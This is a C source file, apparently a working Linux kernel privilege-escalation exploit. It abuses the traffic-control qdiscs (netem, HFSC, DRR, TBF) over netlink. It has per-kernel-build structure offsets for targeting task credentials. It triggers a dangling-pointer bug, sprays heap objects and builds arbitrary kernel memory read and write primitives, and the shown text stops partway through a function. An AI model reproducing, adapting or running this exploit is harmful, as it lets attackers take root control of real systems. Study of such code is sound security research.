#define _GNU_SOURCE
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <sched.h>
#include <errno.h>
#include <time.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/xattr.h>
#include <sys/syscall.h>
#include <sys/timerfd.h>
#include <sys/time.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <linux/pkt_cls.h>
#include <linux/pkt_sched.h>
#include <linux/if_arp.h>
#include <linux/membarrier.h>

#if defined(MITIGATION) || defined(COS)

/* Kernel object offsets */
#define HANDLE_OFF 56 // offsetof(struct Qdisc, handle)
#define NETDEV_OFF 64 // offsetof(struct Qdisc, dev_queue)
#define PRIVDATA_OFF 384 // offsetof(struct Qdisc, privdata)
#define T_HEAD_OFF 8 // offsetof(struct netem_sched_data, t_head)
#define SLOT_CONFIG_OFF 280 // offsetof(struct netem_sched_data, slot_config)
#define SLOT_DIST_OFF 336 // offsetof(struct netem_sched_data, disttable)
#define TABLE_OFF 4 // offsetof(struct disttable, table)
#define ROOT_OFF 16 // offsetof(struct hfsc_sched, root)
#define LEVEL_OFF 100 // offsetof(struct hfsc_class, level)
#define PARENT_OFF 112 // offsetof (struct hfsc_class, cl_parent)
#define CL_VT_OFF 280 // offsetof(struct hfsc_class, cl_vt)
#define CL_CVTMIN_OFF 312 // offsetof(struct hfsc_class, cl_cvtmin)
#define VT_TREE_OFF 184 // offsetof(struct hfsc_class, vt_tree)
#define VT_NODE_OFF 192 // offsetof(struct hfsc_class, vt_node)
#define ROOT_QDISC_OFF 8 // offsetof(struct netdev_queue, qdisc)
#define NET_DEVICE_OFF 0 // offsetof(struct netdev_queue, dev)
#define QDISC_HASH_TABLE_OFF 968 // offsetof(struct net_device, qdisc_hash)
#define IFINDEX_OFF 216 // offsetof(struct net_device, ifindex)
#define QDISC_HLIST_OFF 40 // offsetof(struct Qdisc, hash)
#define SK_OFF 24 // offsetof(struct sk_buff, sk)
#define SOCK_OFF 624 // offsetof(struct sock, sk_socket)
#define FILE_OFF 16 // offsetof(struct socket, file)
#define F_OWNER_OFF 112 // offsetof(struct file, f_owner)
#define PID_OFF 8 // offsetof(struct fown_struct, pid)
#define TASKS_OFF 16 // offsetof(struct pid, tasks)
#define PID_LINKS_OFF 1632 // offsetof(struct task_struct, pid_links)
#define REAL_PARENT_OFF 1536 // offsetof(struct task_struct, real_parent)
#define CRED_OFF 2008 // offsetof(struct task_struct, cred)
#define FS_OFF 2088 // offsetof(struct task_struct, fs)

/* Offset of stab in dump message */
#define STAB_OFF 40

/* Offset of fake HFSC class in disttable */
#define HFSC_CLASS_START 4

/* Increases race window */
#define CLOG_LEN 1000

#elif defined(LTS)

/* Kernel object offsets */
#define HANDLE_OFF 56 // offsetof(struct Qdisc, handle)
#define NETDEV_OFF 64 // offsetof(struct Qdisc, dev_queue)
#define PRIVDATA_OFF 384 // offsetof(struct Qdisc, privdata)
#define T_HEAD_OFF 8 // offsetof(struct netem_sched_data, t_head)
#define SLOT_CONFIG_OFF 296 // offsetof(struct netem_sched_data, slot_config)
#define SLOT_DIST_OFF 352 // offsetof(struct netem_sched_data, disttable)
#define TABLE_OFF 4 // offsetof(struct disttable, table)
#define ROOT_OFF 16 // offsetof(struct hfsc_sched, root)
#define LEVEL_OFF 96 // offsetof(struct hfsc_class, level)
#define PARENT_OFF 112 // offsetof (struct hfsc_class, cl_parent)
#define CL_VT_OFF 280 // offsetof(struct hfsc_class, cl_vt)
#define CL_CVTMIN_OFF 312 // offsetof(struct hfsc_class, cl_cvtmin)
#define VT_TREE_OFF 184 // offsetof(struct hfsc_class, vt_tree)
#define VT_NODE_OFF 192 // offsetof(struct hfsc_class, vt_node)
#define ROOT_QDISC_OFF 8 // offsetof(struct netdev_queue, qdisc)
#define NET_DEVICE_OFF 0 // offsetof(struct netdev_queue, dev)
#define QDISC_HASH_TABLE_OFF 1032 // offsetof(struct net_device, qdisc_hash)
#define IFINDEX_OFF 224 // offsetof(struct net_device, ifindex)
#define QDISC_HLIST_OFF 40 // offsetof(struct Qdisc, hash)
#define SK_OFF 24 // offsetof(struct sk_buff, sk)
#define SOCK_OFF 624 // offsetof(struct sock, sk_socket)
#define FILE_OFF 16 // offsetof(struct socket, file)
#define F_OWNER_OFF 80 // offsetof(struct file, f_owner)
#define PID_OFF 8 // offsetof(struct fown_struct, pid)
#define TASKS_OFF 16 // offsetof(struct pid, tasks)
#define PID_LINKS_OFF 1608 // offsetof(struct task_struct, pid_links)
#define REAL_PARENT_OFF 1512 // offsetof(struct task_struct, real_parent)
#define CRED_OFF 1984 // offsetof(struct task_struct, cred)
#define FS_OFF 2064 // offsetof(struct task_struct, fs)

/* Offset of stab in dump message */
#define STAB_OFF 48

/* Offset of fake HFSC class in disttable */
#define HFSC_CLASS_START 4

/* Increases race window */
#define CLOG_LEN 0

#endif

/* Traffic control handles */
#define VULN_NETEM_HANDLE 0xdead0000

/* Size of disttable */
#define DIST_SIZE 1020

#define TIMER_BASE 50000
#define TIMER_INC 100
#define LABEL_TO_VALUE(x) (TIMER_BASE + TIMER_INC*x)

#define DRR_SPRAY 36
#define NETEM_SPRAY 20

#define err_exit(s) do { perror(s); exit(EXIT_FAILURE); } while(0)

int clog_len;
unsigned char msgbuf[65536];

/* Netlink Messages */

/* Traffic control message header */
struct __attribute__((packed)) tf_msg {
    struct nlmsghdr nh;
    struct tcmsg tm;
};

/* Network interface message header */
struct __attribute__((packed)) if_msg {
    struct nlmsghdr nh;
    struct ifinfomsg ifi;
};

/* Set loopback interface up */
struct if_msg if_up_msg = {
    {
        .nlmsg_len = 32,
        .nlmsg_type = RTM_NEWLINK,
        .nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK,
    },
    {
        .ifi_family = AF_UNSPEC,
        .ifi_type = ARPHRD_NETROM,
        .ifi_index = 1,
        .ifi_flags = IFF_UP,
        .ifi_change = 1,
    },

};

/* Add/modify an HFSC qdisc */
struct __attribute__((packed)) hfsc_qdisc_msg {
    struct nlmsghdr nh;
    struct tcmsg tm;
    struct rtattr kind_hdr;
    char kind[8];
    struct rtattr options_hdr;
    int def;
};

struct hfsc_qdisc_msg hfsc_qdisc_msg = {
    {
        .nlmsg_len = sizeof(struct hfsc_qdisc_msg),
        .nlmsg_type = RTM_NEWQDISC,
        .nlmsg_flags = NLM_F_REQUEST | NLM_F_REPLACE | NLM_F_ACK | NLM_F_CREATE,
    },
    {
        .tcm_family = PF_UNSPEC,
        .tcm_ifindex = 1,
    },
    .kind_hdr =
    {
        .rta_len = 12,
        .rta_type = TCA_KIND,
    },
    .kind = "hfsc",
    .options_hdr =
    {
        .rta_len = 8,
        .rta_type = TCA_OPTIONS,
    },
};

/* Add/modify an RSC HFSC class */
struct __attribute__((packed)) rsc_class_msg {
    struct nlmsghdr nh;
    struct tcmsg tm;
    struct rtattr kind_hdr;
    char kind[8];
    struct rtattr options_hdr;
    struct rtattr rsc_hdr;
    struct tc_service_curve rsc;
};

struct rsc_class_msg rsc_class_msg = {
    {
        .nlmsg_len = sizeof(struct rsc_class_msg),
        .nlmsg_type = RTM_NEWTCLASS,
        .nlmsg_flags = NLM_F_REQUEST | NLM_F_REPLACE | NLM_F_ACK | NLM_F_CREATE,
    },
    {
        .tcm_family = PF_UNSPEC,
        .tcm_ifindex = 1,
    },
    .kind_hdr = {
        .rta_len = 12,
        .rta_type = TCA_KIND,
    },
    .kind = "hfsc",
    .options_hdr = {
        .rta_len = 20,
        .rta_type = TCA_OPTIONS,
    },
    .rsc_hdr = {
        .rta_len = 16,
        .rta_type = TCA_HFSC_RSC,
    },
    .rsc = {
        .m1 = 1,
        .d= 1,
    },
};

/* Add/modify an FSC HFSC class */
struct __attribute__((packed)) fsc_class_msg {
    struct nlmsghdr nh;
    struct tcmsg tm;
    struct rtattr kind_hdr;
    char kind[8];
    struct rtattr options_hdr;
    struct rtattr fsc_hdr;
    struct tc_service_curve fsc;
};

struct fsc_class_msg fsc_class_msg = {
    {
        .nlmsg_len = sizeof(struct fsc_class_msg),
        .nlmsg_type = RTM_NEWTCLASS,
        .nlmsg_flags = NLM_F_REQUEST | NLM_F_REPLACE | NLM_F_ACK | NLM_F_CREATE,
    },
    {
        .tcm_family = PF_UNSPEC,
        .tcm_ifindex = 1,
    },
    .kind_hdr =
    {
        .rta_len = 12,
        .rta_type = TCA_KIND,
    },
    .kind = "hfsc",
    .options_hdr =
    {
        .rta_len = 20,
        .rta_type = TCA_OPTIONS,
    },
    .fsc_hdr = {
        .rta_len = 16,
        .rta_type = TCA_HFSC_FSC,
    },
    .fsc = {
        .m1 = 1,
        .d= 1,
    },
};

/* Add/modify a DRR qdisc */
struct __attribute__((packed)) drr_qdisc_msg {
    struct nlmsghdr nh;
    struct tcmsg tm;
    struct rtattr kind_hdr;
    char kind[8];
};

struct drr_qdisc_msg drr_qdisc_msg = {
    {
        .nlmsg_len = sizeof(struct drr_qdisc_msg),
        .nlmsg_type = RTM_NEWQDISC,
        .nlmsg_flags = NLM_F_REQUEST | NLM_F_REPLACE | NLM_F_ACK | NLM_F_CREATE,
    },
    {
        .tcm_family = PF_UNSPEC,
        .tcm_ifindex = 1,
    },
    .kind_hdr =
    {
        .rta_len = 12,
        .rta_type = TCA_KIND,
    },
    .kind = "drr",
};

struct __attribute__((packed)) drr_class_msg {
    struct nlmsghdr nh;
    struct tcmsg tm;
    struct rtattr kind_hdr;
    char kind[8];
    struct rtattr options_hdr;
};

/* Add/modify a DRR class */
struct drr_class_msg drr_class_msg = {
    {
        .nlmsg_len = sizeof(struct drr_class_msg),
        .nlmsg_type = RTM_NEWTCLASS,
        .nlmsg_flags = NLM_F_REQUEST | NLM_F_REPLACE | NLM_F_ACK | NLM_F_CREATE,
    },
    {
        .tcm_family = PF_UNSPEC,
        .tcm_ifindex = 1,
    },
    .kind_hdr = {
        .rta_len = 12,
        .rta_type = TCA_KIND,
    },
    .kind = "drr",
    .options_hdr = {
        .rta_len = 4,
        .rta_type = TCA_OPTIONS,
    },
};

/* Add/modify a TBF qdisc to let packets through */
struct __attribute__((packed)) tbf_qdisc_msg {
    struct nlmsghdr nh;
    struct tcmsg tm;
    struct rtattr kind_hdr;
    char kind[8];
    struct rtattr options_hdr;
    struct rtattr qopt_hdr;
    struct tc_tbf_qopt qopt;
};

struct tbf_qdisc_msg tbf_qdisc_msg = {
    {
        .nlmsg_len = sizeof(struct tbf_qdisc_msg),
        .nlmsg_type = RTM_NEWQDISC,
        .nlmsg_flags = NLM_F_REQUEST | NLM_F_REPLACE | NLM_F_ACK | NLM_F_CREATE,
    },
    {
        .tcm_family = PF_UNSPEC,
        .tcm_ifindex = 1,
    },
    .kind_hdr =
    {
        .rta_len = 12,
        .rta_type = TCA_KIND,
    },
    .kind = "tbf",
    .options_hdr = {
        .rta_len = 44,
        .rta_type = TCA_OPTIONS,
    },
    .qopt_hdr = {
        .rta_len = 40,
        .rta_type = TCA_TBF_PARMS,
    },
    .qopt = {
        .limit = 65536,
        .buffer = 65536,
        .rate = {
            .linklayer = TC_LINKLAYER_ETHERNET,
            .rate = 1000000000,
        },
    },
};

/* Add/modify a TBF qdisc to wait for pkt_len-1 secs */
struct __attribute__((packed)) stall_tbf_qdisc_msg {
    struct nlmsghdr nh;
    struct tcmsg tm;
    struct rtattr kind_hdr;
    char kind[8];
    struct rtattr options_hdr;
    struct rtattr qopt_hdr;
    struct tc_tbf_qopt qopt;
    struct rtattr burst_hdr;
    int burst;
};

struct stall_tbf_qdisc_msg stall_tbf_qdisc_msg = {
    {
        .nlmsg_len = sizeof(struct stall_tbf_qdisc_msg),
        .nlmsg_type = RTM_NEWQDISC,
        .nlmsg_flags = NLM_F_REQUEST | NLM_F_REPLACE | NLM_F_ACK | NLM_F_CREATE,
    },
    {
        .tcm_family = PF_UNSPEC,
        .tcm_ifindex = 1,
    },
    .kind_hdr =
    {
        .rta_len = 12,
        .rta_type = TCA_KIND,
    },
    .kind = "tbf",
    .options_hdr = {
        .rta_len = 52,
        .rta_type = TCA_OPTIONS,
    },
    .qopt_hdr = {
        .rta_len = 40,
        .rta_type = TCA_TBF_PARMS,
    },
    .qopt = {
        .limit = 65536,
        .rate = {
            .linklayer = TC_LINKLAYER_ETHERNET,
            .rate = 1,
        },
    },
    .burst_hdr = {
        .rta_len = 8,
        .rta_type = TCA_TBF_BURST,
    },
    .burst = 1,
};

/* Add/modify a netem qdisc to create a dangling pointer in its parent qdisc */
struct __attribute__((packed)) vuln_netem_qdisc_msg {
    struct nlmsghdr nh;
    struct tcmsg tm;
    struct rtattr kind_hdr;
    char kind[8];
    struct rtattr options_hdr;
    struct tc_netem_qopt qopt;
};

struct vuln_netem_qdisc_msg vuln_netem_qdisc_msg = {
    {
        .nlmsg_len = sizeof(struct vuln_netem_qdisc_msg),
        .nlmsg_type = RTM_NEWQDISC,
        .nlmsg_flags = NLM_F_REQUEST | NLM_F_REPLACE | NLM_F_ACK | NLM_F_CREATE,
    },
    {
        .tcm_family = PF_UNSPEC,
        .tcm_ifindex = 1,
    },
    .kind_hdr =
    {
        .rta_len = 12,
        .rta_type = TCA_KIND,
    },
    .kind = "netem",
    .options_hdr =
    {
        .rta_len = 28,
        .rta_type = TCA_OPTIONS,
    },
    .qopt = {
        .duplicate = -1,
    }
};

/* Add/modify a netem qdisc with many parameters. Used for type confusion */
struct __attribute__((packed)) parms_netem_qdisc_msg {
    struct nlmsghdr nh;
    struct tcmsg tm;
    struct rtattr kind_hdr;
    char kind[8];
    struct rtattr options_hdr;
    struct tc_netem_qopt qopt;
    struct rtattr ecn_hdr;
    int ecn;
    struct rtattr latency_hdr;
    long latency;
    struct rtattr jitter_hdr;
    long jitter;
    struct rtattr reorder_hdr;
    struct tc_netem_reorder reorder;
    struct rtattr corrupt_hdr;
    struct tc_netem_corrupt corrupt;
    struct rtattr rate_hdr;
    struct tc_netem_rate rate;
    struct rtattr rate64_hdr;
    long rate64;
    struct rtattr slot_hdr;
    struct tc_netem_slot slot;
};

struct parms_netem_qdisc_msg parms_netem_qdisc_msg = {
    {
        .nlmsg_len = sizeof(struct parms_netem_qdisc_msg),
        .nlmsg_type = RTM_NEWQDISC,
        .nlmsg_flags = NLM_F_REQUEST | NLM_F_REPLACE | NLM_F_ACK | NLM_F_CREATE,
    },
    {
        .tcm_family = PF_UNSPEC,
        .tcm_ifindex = 1,
    },
    .kind_hdr =
    {
        .rta_len = 12,
        .rta_type = TCA_KIND,
    },
    .kind = "netem",
    .options_hdr = {
        .rta_len = 160,
        .rta_type = TCA_OPTIONS,
    },
    .qopt = {
        .limit = 65536,
    },
    .ecn_hdr = {
        .rta_len = 8,
        .rta_type = TCA_NETEM_ECN,
    },
    .latency_hdr = {
        .rta_len = 12,
        .rta_type = TCA_NETEM_LATENCY64,
    },
    .jitter_hdr = {
        .rta_len = 12,
        .rta_type = TCA_NETEM_JITTER64,
    },
    .reorder_hdr = {
        .rta_len = 12,
        .rta_type = TCA_NETEM_REORDER,
    },
    .corrupt_hdr = {
        .rta_len = 12,
        .rta_type = TCA_NETEM_CORRUPT,
    },
    .rate64_hdr = {
        .rta_len = 12,
        .rta_type = TCA_NETEM_RATE64,
    },
    .rate_hdr = {
        .rta_len = 20,
        .rta_type = TCA_NETEM_RATE,
    },
    .slot_hdr = {
        .rta_len = 44,
        .rta_type = TCA_NETEM_SLOT,
    },
};

/* Add/modify a netem qdisc with a slot_dist buffer */
struct __attribute__((packed)) dist_netem_qdisc_msg {
    struct nlmsghdr nh;
    struct tcmsg tm;
    struct rtattr kind_hdr;
    char kind[8];
    struct rtattr options_hdr;
    struct tc_netem_qopt qopt;
    struct rtattr dist_hdr;
    char dist[DIST_SIZE];
};

struct dist_netem_qdisc_msg dist_netem_qdisc_msg = {
    {
        .nlmsg_len = sizeof(struct dist_netem_qdisc_msg),
        .nlmsg_type = RTM_NEWQDISC,
        .nlmsg_flags = NLM_F_REQUEST | NLM_F_REPLACE | NLM_F_ACK | NLM_F_CREATE,
    },
    {
        .tcm_family = PF_UNSPEC,
        .tcm_ifindex = 1,
    },
    .kind_hdr =
    {
        .rta_len = 12,
        .rta_type = TCA_KIND,
    },
    .kind = "netem",
    .options_hdr =
    {
        .rta_len = 32 + DIST_SIZE,
        .rta_type = TCA_OPTIONS,
    },
    .dist_hdr = {
        .rta_len = 4 + DIST_SIZE,
        .rta_type = TCA_NETEM_SLOT_DIST,
    },
};

/* Add a basic filter */
struct __attribute__((packed)) basic_filter_msg {
    struct nlmsghdr nh;
    struct tcmsg tm;
    struct rtattr kind_hdr;
    char kind[8];
    struct rtattr options_hdr;
    struct rtattr classid_hdr;
    int classid;
};

struct basic_filter_msg basic_filter_msg = {
    {
        .nlmsg_len = sizeof(struct basic_filter_msg),
        .nlmsg_type = RTM_NEWTFILTER,
        .nlmsg_flags = NLM_F_REQUEST | NLM_F_REPLACE | NLM_F_ACK | NLM_F_CREATE,
    },
    {
        .tcm_family = PF_UNSPEC,
        .tcm_ifindex = 1,
        .tcm_handle = 1,
        .tcm_info = TC_H_MAKE(1 << 16, 3 << 8),
    },
    .kind_hdr =
    {
        .rta_len = 12,
        .rta_type = TCA_KIND,
    },
    .kind = "basic",
    .options_hdr =
    {
        .rta_len = 12,
        .rta_type = TCA_OPTIONS,
    },
    .classid_hdr = {
        .rta_len = 8,
        .rta_type = TCA_BASIC_CLASSID,
    },
};

/* Delete all of a qdisc's filters */
struct tf_msg del_filter_msg = {
    {
        .nlmsg_len = sizeof(struct tf_msg),
        .nlmsg_type = RTM_DELTFILTER,
        .nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK,
    },
    {
        .tcm_family = PF_UNSPEC,
        .tcm_ifindex = 1,
    },
};

/* Delete a qdisc */
struct tf_msg del_qdisc_msg = {
    {
        .nlmsg_len = sizeof(struct tf_msg),
        .nlmsg_type = RTM_DELQDISC,
        .nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK,
    },
    {
        .tcm_family = PF_UNSPEC,
        .tcm_ifindex = 1,
    },
};

/* Delete a class */
struct tf_msg del_class_msg = {
    {
        .nlmsg_len = sizeof(struct tf_msg),
        .nlmsg_type = RTM_DELTCLASS,
        .nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK,
    },
    {
        .tcm_family = PF_UNSPEC,
        .tcm_ifindex = 1,
    },
};

/* Dump info for all qdiscs */
struct tf_msg get_qdisc_msg = {
    {
        .nlmsg_len = sizeof(struct tf_msg),
        .nlmsg_type = RTM_GETQDISC,
        .nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK | NLM_F_DUMP,
    },
    {
        .tcm_family = PF_UNSPEC,
        .tcm_ifindex = 1,
    },
};


/* Syscall used to wait for RCU grace period */
int membarrier(unsigned int flags, int cpu_id) {
    return syscall(SYS_membarrier, flags, cpu_id);
}

void pin_cpu (int cpu) {
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    if (sched_setaffinity(0, sizeof(set), &set))
        err_exit("[-] sched_setaffinity");
}

/*
 * Send a message on the loopback device. Used to trigger qdisc enqueue and
 * dequeue functions.
 */
struct sockaddr_in iaddr;
int inet_sock_fd, client_sock_fd;
int nl_sock_fd;
void loopback_send (void) {
    if (sendto(client_sock_fd, "", 1, 0, &iaddr, sizeof(iaddr)) == -1)
        err_exit("[-] sendto");
}

/* Helper functions for sending netlink messages */

void netlink_write (int sock, struct tf_msg *m) {
    struct {
        struct nlmsghdr nh;
        struct nlmsgerr ne;
    } ack = {};
    if (write(sock, m, m->nh.nlmsg_len) == -1)
        err_exit("[-] write");
    if (read(sock , &ack, sizeof(ack)) == -1)
        err_exit("[-] read");
    if (/*ack.nh.nlmsg_type == NLMSG_ERROR && */ack.ne.error) {
        errno = -ack.ne.error;
        perror("[-] netlink");
        exit(EXIT_FAILURE);
    }
}

void netlink_write_noerr (int sock, struct tf_msg *m) {
    m->nh.nlmsg_flags &= ~NLM_F_ACK;
    if (write(sock, m, m->nh.nlmsg_len) == -1)
        err_exit("[-] write");
    m->nh.nlmsg_flags |= NLM_F_ACK;
}


int tc_add_qd (struct tf_msg *m, int parent, int handle) {
    m->tm.tcm_parent = parent;
    m->tm.tcm_handle = handle;
    netlink_write(nl_sock_fd, m);
    return m->tm.tcm_handle;
}

void tc_del_qd (int parent) {
    struct tf_msg *m = &del_qdisc_msg;
    m->tm.tcm_parent = parent;
    netlink_write(nl_sock_fd, m);
}

int tc_add_cl (struct tf_msg *m, int parent, int handle) {
    m->tm.tcm_parent = parent;
    m->tm.tcm_handle = parent | handle;
    netlink_write(nl_sock_fd, m);
    return m->tm.tcm_handle;
}

void tc_del_cl (int handle) {
    struct tf_msg *m = &del_class_msg;
    m->tm.tcm_handle = handle;
    netlink_write_noerr(nl_sock_fd, m);
}

void tc_add_fl_ (struct tf_msg *m, int *clid_p, int parent, int clid) {
    m->tm.tcm_parent = parent;
    *clid_p = parent | clid;
    netlink_write(nl_sock_fd, m);
}

void tc_add_fl (int clid) {
    basic_filter_msg.tm.tcm_parent = clid & 0xffff0000;
    basic_filter_msg.classid = clid;
    netlink_write(nl_sock_fd, &basic_filter_msg);
}

void tc_del_fl (int clid) {
    struct tf_msg *m = &del_filter_msg;
    m->tm.tcm_parent = clid & 0xffff0000;
    netlink_write(nl_sock_fd, m);

}

/* Trigger the bug, creating a dangling pointer to parent class.
 * Qdiscs must be configured so packet is enqueued at target class. */
void trigger_vuln (int parent) {
    tc_add_qd(&vuln_netem_qdisc_msg, parent, VULN_NETEM_HANDLE);
    loopback_send();
    tc_del_qd(parent);
}

/* Functions for reading and writing kernel memory */

void write_netem_parms(int handle, int *parms, struct tc_netem_slot *slot) {
    struct parms_netem_qdisc_msg *m = &parms_netem_qdisc_msg;
    if (parms) {
        m->latency = *(long *)&parms[0];
        m->jitter = parms[2];
        // parms[3] corresponds to unwritable memory
        m->qopt.loss = parms[4];
        m->ecn = parms[5];
        m->qopt.limit = parms[6];
        // parms[7] corresponds to unwritable memory
        m->qopt.gap = parms[8];
        m->qopt.duplicate = parms[9];
        m->reorder.probability = parms[10];
        m->corrupt.probability = parms[11];
        m->rate64 = *(long *)&parms[12];
    }
    if (slot)
        m->slot = *slot;
    tc_add_qd(m, 0, handle);
}

void read_netem_parms (int handle, char *buf) {
    int nread, tread = 0;
    netlink_write_noerr(nl_sock_fd, &get_qdisc_msg);
    do {
        if ((nread = read(nl_sock_fd, msgbuf + tread, sizeof(msgbuf))) == -1)
            err_exit("[-] read");
        tread += nread;
    } while (nread != 20);
    tread -= 20;

    int off = -1;
    for (int i = 0; i <= tread - sizeof(int); i++) {
        if (*(int *)&msgbuf[i] == handle       /* "netem" */
                && *(long *)&msgbuf[i + 16] == 0x6d6574656e) {
            off = i;
            break;
        }
    }

    if (off != -1) {
        memcpy(buf, msgbuf + off + 56, 8); // latency
        memcpy(buf + 8, msgbuf + off + 68, 8); // jitter
        memcpy(buf + 16, msgbuf + off + 36, 4); // loss
        memcpy(buf + 20, msgbuf + off + 140, 4); // ecn
        memcpy(buf + 24, msgbuf + off + 32, 4); // limit
        memset(buf + 28, 0, 4); // counter (always zero)
        memcpy(buf + 32, msgbuf + off + 40, 4); // gap
        memcpy(buf + 36, msgbuf + off + 44, 4); // duplicate
        memcpy(buf + 40, msgbuf + off + 96, 4); // reorder
        memcpy(buf + 44, msgbuf + off + 108, 4); // corrupt
        memcpy(buf + 48, msgbuf + off + 120, 8); // rate
    }
    memset(msgbuf, 0, sizeof(msgbuf));
}

long *stab_addr;
int stab_handle;
long stab_needle;
long stab_parms_buf[7], stab_slot_buf[5];

void setup_stab_read (int handle, long parms_kaddr, long slot_kaddr) {
    int flags = 0x80;
    memcpy((char *)stab_parms_buf + 9, &flags, 4);
    slot_kaddr += 32;
    memcpy((char *)stab_parms_buf + 33, &slot_kaddr, 8);
    slot_kaddr -= 32;

    parms_kaddr += 48 - IFINDEX_OFF;
    memcpy((char *)stab_parms_buf + 1, &parms_kaddr, 8);
    parms_kaddr -= 48 - IFINDEX_OFF;

    stab_parms_buf[6] = 0xdeadbeef; // lower bytes of needle

    stab_slot_buf[1] = 0; // flags ; limit
    stab_slot_buf[2] = parms_kaddr + 232; // ops
    stab_slot_buf[3] = 0xbad57ab; // stab
    stab_slot_buf[4] = 0; // hash

    stab_addr = &stab_slot_buf[3];
    stab_needle = stab_slot_buf[2] << 32 | stab_parms_buf[6];
    stab_handle = handle;
}

void read_netem_stab (long needle, char *buf, int n) {
    int nread, tread = 0;

    netlink_write_noerr(nl_sock_fd, &get_qdisc_msg);
    do {
        if ((nread = read(nl_sock_fd, msgbuf + tread, sizeof(msgbuf))) == -1)
            err_exit("[-] read");
        tread += nread;
    } while (nread != 20);
    tread -= 20;

    int off = -1;
    for (int i = 0; i <=  - sizeof(int); i++) {
        if (*(long *)&msgbuf[i] == needle) {
            off = i;
            break;
        }
    }

    n = n > 24 ? 24 : n;
    if (off != -1)
        memcpy(buf, msgbuf + off + STAB_OFF, n);
    else
        printf("[-] Failed to find stab\n");

    memset(msgbuf, 0, sizeof(msgbuf));
}

long stab_read_8 (long addr) {
    long val;
    *stab_addr = addr - 32;
    write_netem_parms(stab_handle, stab_parms_buf, stab_slot_buf);
    tc_add_qd(&parms_netem_qdisc_msg, 0, stab_handle);
    read_netem_stab(stab_needle, &val, 8);
    return val;
}

void stab_read_n (char *buf, long addr, int n) {
    int nread;
    *stab_addr = addr - 32;
    write_netem_parms(stab_handle, stab_parms_buf, stab_slot_buf);
    tc_add_qd(&parms_netem_qdisc_msg, 0, stab_handle);
    for (nread = 0; nread < n - n % 24; nread += 24) {
        tc_add_qd(&parms_netem_qdisc_msg, 0, stab_handle);
        read_netem_stab(stab_needle, buf + nread, 24);
        *stab_addr += 24;
    }
    if (n % 24) {
        tc_add_qd(&parms_netem_qdisc_msg, 0, stab_handle);
        read_netem_stab(stab_needle, buf + nread, n % 24);
    }
}

int vt_handle;
long vt_dist_p_kaddr;
long setup_vt_write (int handle, long addr) {
    vt_handle = handle;
    vt_dist_p_kaddr = addr + PRIVDATA_OFF + SLOT_DIST_OFF;
    hfsc_qdisc_msg.def = 0;
    tc_add_qd(&hfsc_qdisc_msg, 0, 0x150000);
}

long root_addr;
void vt_write_8 (long addr, long val) {
    long parms[7] = {}, *hfsc_class, dist_kaddr;
    hfsc_class = &dist_netem_qdisc_msg.dist[HFSC_CLASS_START];
    ((int *)hfsc_class)[LEVEL_OFF/4] = 1;
    hfsc_class[PARENT_OFF/8] = addr - CL_CVTMIN_OFF;
    hfsc_class[CL_VT_OFF/8] = val;
    tc_add_qd(&dist_netem_qdisc_msg, 0, vt_handle);

    dist_kaddr = stab_read_8(vt_dist_p_kaddr);
    dist_kaddr += TABLE_OFF + HFSC_CLASS_START + VT_NODE_OFF;
    memcpy((char *)parms + 1, &dist_kaddr, 8);

    write_netem_parms(vt_handle, parms, NULL);
    loopback_send();
}

/* Functions for setting timers */

int add_order[] = { 0, 1, 2, 4, 9, 3, 5, 11, 10, 13, 12, 15, 6, 7, 8, 14, 16, };
#define NUM_NODES (sizeof(add_order)/sizeof(*add_order))
#define NUM_NEG_NODES 20
int timer_fds[NUM_NODES];
int neg_timerfds[NUM_NEG_NODES];
void init_timers () {
    for (int i = 0; i < NUM_NODES - 2; i++) {
        timer_fds[add_order[i]] = timerfd_create(CLOCK_MONOTONIC, 0);
        if (timer_fds[i] == -2)
            err_exit("[-] timerfd_create");
    }
    for (int i = 0; i < NUM_NEG_NODES; i++) {
        neg_timerfds[i] = timerfd_create(CLOCK_MONOTONIC, 0);
        if (neg_timerfds[i] == -1)
            err_exit("[-] timerfd_create");
    }
}

void add_neg_nodes (void) {
    struct itimerspec t = {};
    t.it_value.tv_sec = LABEL_TO_VALUE(-1);
    for (int i = 0; i < NUM_NEG_NODES; i++) {
        if (timerfd_settime(neg_timerfds[i], 0, &t, NULL) == -1)
            err_exit("[-] timerfd_settime");
    }
}

void add_timer_node (long label) {
    struct itimerspec t = {};
    t.it_value.tv_sec = LABEL_TO_VALUE(label);
    if (timerfd_settime(timer_fds[label], 0, &t, NULL) == -1)
        err_exit("[-] timerfd_settime");
}

void rm_timer_node (long val) {
    struct itimerspec t = {};
    if (timerfd_settime(timer_fds[val], 0, &t, NULL) == -1)
        err_exit("[-] timerfd_settime");
}

#define GR 0x61c88647u
#define QDISC_HASH(x) ((x)*GR >> 28)
long handle_to_kaddr (int handle, long netdevq_kaddr) {
    long next_addr;
    next_addr = stab_read_8(netdevq_kaddr + NET_DEVICE_OFF) + QDISC_HASH_TABLE_OFF;
    next_addr = stab_read_8(next_addr + 8*QDISC_HASH(handle));
    while (next_addr) {
        if ((int)stab_read_8(next_addr + HANDLE_OFF - QDISC_HLIST_OFF) == handle)
            return next_addr - QDISC_HLIST_OFF;
        next_addr = stab_read_8(next_addr);
    }
    return 0;
}

int drr_spray_and_find (int parent) {
    int drr_spray[DRR_SPRAY];

    for (int i = 0; i < DRR_SPRAY; i++)
        drr_spray[i] = tc_add_cl(&drr_class_msg, parent, i + 1);

    int target = 0;
    for (int i = 0; i < DRR_SPRAY; i++) {
        if (!target) {
            tc_add_fl(drr_spray[i]);
            loopback_send();
            if (recv(inet_sock_fd, &msgbuf, 1, MSG_DONTWAIT) != -1) {
                target = drr_spray[i];
                printf("[+] Found target DRR class %x\n", target);
                continue;
            }
            tc_del_fl(drr_spray[i]);
        }
        tc_del_cl(drr_spray[i]);
    }

    if (!target) {
        printf("[-] DRR spray on %x failed\n", parent);
        exit(EXIT_FAILURE);
    }

    return target;
}

void add_qdisc_timer_nodes (int parent, int root, int *spray_handles, int spray_hash, int label) {

    /* Handles of the current leaf of the three branches, and handle of tbf qdisc's parent */
